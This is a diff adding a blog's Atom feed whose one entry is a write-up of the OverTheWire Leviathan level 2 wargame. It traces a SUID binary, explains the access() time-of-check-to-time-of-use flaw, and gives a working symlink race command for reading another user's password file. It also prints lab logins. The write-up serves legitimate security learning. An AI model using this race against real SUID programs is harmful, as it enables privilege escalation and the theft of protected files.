@@ -1,0 +1,128 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-us">
+  <title>l1ge&#39;s cabin</title>
+  <subtitle></subtitle>
+  <id>https://l1ge.github.io/</id>
+  <author>
+    <name>l1ge&#39;s cabin</name>
+    <uri>https://l1ge.github.io/</uri>
+  </author>
+  <icon>https://l1ge.github.io/image/brand/icon-1-1.png</icon>
+  <logo>https://l1ge.github.io/image/brand/icon-2-1.png</logo>
+  <updated>2020-05-05T12:35:22Z</updated>
+  <link rel="self" type="application/atom+xml" href="https://l1ge.github.io/feed.atom" hreflang="en-us"/>
+  <link rel="alternate" type="text/html" href="https://l1ge.github.io/" hreflang="en-us"/>
+  <entry>
+    <title>OverTheWire: Leviathan 2 Write-Up</title><author>
+      <name>l1ge</name>
+      <uri></uri>
+    </author>
+    <id>https://l1ge.github.io/leviathan2/</id>
+    <updated>2020-05-04T14:00:00Z</updated>
+    <published>2020-05-04T14:00:00Z</published>
+    <content type="html"><p>There are plenty of write-ups out there for Leviathan's Level 2.  But none of them solved it the way I did: <strong>the fun way!</strong>
+Let's first access the level</p>
+<blockquote>
+<p>ssh -p 2223 leviathan2@leviathan.labs.overthewire.org</p>
+<p>password: ougahZi8Ta</p>
+</blockquote>
+<p>In the home folder there is an executable named <code>printfile</code>. Let's check its permissions</p>
+<pre><code class="language-bash">$ ls -l
+total 8
+-r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
+</code></pre>
+<p>It has the SUID bit (s), which means we can run it with the permissions of its owner leviathan3
+Great! so let's try to print leviathan3 password</p>
+<pre><code class="language-bash">$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+</code></pre>
+<p>That would have been too easy. For some reason <code>printfile</code> doesn't allow us to access a file owned by leviathan3 despite the SUID bit. Let's investigate the binary with the command <code>ltrace</code></p>
+<pre><code class="language-bash">$ ltrace ./printfile /etc/leviathan_pass/leviathan3
+__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 &lt;unfinished ...&gt;
+access(&quot;/etc/leviathan_pass/leviathan3&quot;, 4)                         = -1
+puts(&quot;You cant have that file...&quot;You cant have that file...
+)                                  = 27
++++ exited (status 1) +++
+</code></pre>
+<p>I also tried <code>strace</code> to check the system calls</p>
+<pre><code class="language-bash">$ strace ./printfile /etc/leviathan_pass/leviathan3
+execve(&quot;./printfile&quot;, [&quot;./printfile&quot;, &quot;/etc/leviathan_pass/leviathan3&quot;], [/* 17 vars */]) = 0
+strace: [ Process PID=32706 runs in 32 bit mode. ]
+brk(NULL)                               = 0x804b000
+fcntl64(0, F_GETFD)                     = 0
+fcntl64(1, F_GETFD)                     = 0
+fcntl64(2, F_GETFD)                     = 0
+access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0
+mmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
+close(3)                                = 0
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib32/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
+read(3, &quot;\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0&quot;..., 512) = 512
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
+mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
+mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
+mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
+close(3)                                = 0
+mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
+set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
+mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
+mprotect(0x8049000, 4096, PROT_READ)    = 0
+mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
+munmap(0xf7fc9000, 36357)               = 0
+access(&quot;/etc/leviathan_pass/leviathan3&quot;, R_OK) = -1 EACCES (Permission denied)
+fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 7), ...}) = 0
+brk(NULL)                               = 0x804b000
+brk(0x806c000)                          = 0x806c000
+write(1, &quot;You cant have that file...\n&quot;, 27You cant have that file...
+) = 27
+exit_group(1)                           = ?
++++ exited with 1 +++
+</code></pre>
+<p>To be honest, I don't understand what most of this means, but one line is pretty straightforward :</p>
+<pre><code class="language-bash">access(&quot;/etc/leviathan_pass/leviathan3&quot;, R_OK) = -1 EACCES (Permission denied)
+</code></pre>
+<p>There is an <em>access()</em> function that checks if I can access the file. Let's investigate how that function works.
+From this <a href="https://linux.die.net/man/2/access">link</a> I get a few interesting informations:</p>
+<blockquote>
+<p>The check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. This allows set-user-ID programs to easily determine the invoking user's authority.</p>
+</blockquote>
+<p>OK now I understand why, despite the SUID bit on the <code>printfile</code>, I can't access the password file.
+I keep reading and stumble upon a serious lead :</p>
+<blockquote>
+<p><strong>Warning</strong>: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.</p>
+</blockquote>
+<p>I like that!
+I decide to Google more and I discovered that this kind of vulnerabilities was called <strong>TOCTOU</strong> (Time-of-check to time-of-use) and was mostly abused using symlinks.</p>
+<p>The idea is to modify the file between the moment it gets checked for permissions and the moment it gets opened. This is done by creating a symlink on the file, targeting the real file we wanna access. But this happens so fast, how can I do that ?</p>
+<p>That's when it becomes fun. I could have made a script but in the intro of the Leviathan's series, its said you don't need to write scripts to solve any of the level.</p>
+<p>Instead I did it... manually.</p>
+<p>I used <code>tmux</code> to be able to launch two commands simultaneously. You can also use <code>screen</code></p>
+<pre><code class="language-bash">$watch -n 0.1 &quot;touch /tmp/l1ge/lev3; ln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3; rm /tmp/l1ge/lev3&quot;
+</code></pre>
+<p>This command runs every 0.1 seconds with<code>watch -n 0.1</code></p>
+<ul>
+<li><code>touch /tmp/l1ge/lev3</code> - creates a file <em>lev3</em></li>
+<li><code>ln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3</code>  - Creates a symlink on <em>lev3</em> targetting leviathan3's password file</li>
+<li><code>rm /tmp/l1ge/lev3</code> - Deletes <em>lev3</em></li>
+</ul>
+<p>To sum up, every 0.1 seconds it creates a file with permissions that can pass the <em>access()</em> function, symlinks it to the file we really wanna access, deletes it and start all over again.</p>
+<p>My plan is to run <code>./printfile</code> on my <em>lev3</em> file repeatedly until it magically sync up perfectly and the symlink happens right between <em>access()</em> reads the permissions and it gets passed to <code>cat</code> to print its content.</p>
+<p>And to do that without a script, I'll use my fingers</p>
+<p>I fire-up another <code>tmux</code> window and here I go, hitting UP ARROW and ENTER as fast I can to execute randomly the command on repeat.</p>
+<pre><code class="language-bash">$ ./printfile /tmp/l1ge/lev3
+</code></pre>
+<p>...until I hope the password magically appears. When you find yourself doing something so stupid on a CTF,  a strong inner voice tells you to give up and never touch a computer again.</p>
+<p>BUT in less than 1mn the magic happened, that's fast enough to bypass my own pessimism.</p>
+<p><img src="/image/leviathan2.jpg" alt=""></p>
+<p>Our password is  <strong>Ahdiemoo1j</strong></p>
+<p>There is of course a most reliable way to solve this level and you can check the other write-ups about it.</p>
+<p>Hope you enjoyed!</p>
+<p>Cheers,
+l1ge.</p></content>
+  </entry>
+</feed>
